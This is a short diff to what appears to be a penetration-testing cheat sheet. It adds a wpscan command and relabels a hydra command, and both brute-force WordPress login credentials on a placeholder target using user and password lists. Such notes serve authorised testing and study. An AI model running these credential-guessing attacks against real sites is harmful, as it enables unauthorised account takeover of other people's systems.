@@ -63,10 +63,16 @@ ssh -i <FILENAME> <USER>@<IP>
 
 # HTTP, HTTPS - 80, 443
 
-## Brute force
+## Brute force(hydra)
 
 ``` bash
 hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
+```
+
+## Brute force(wpscan)
+
+```bash
+wpscan --url http://target.com:8081 --passwords pass.txt
 ```
 
 
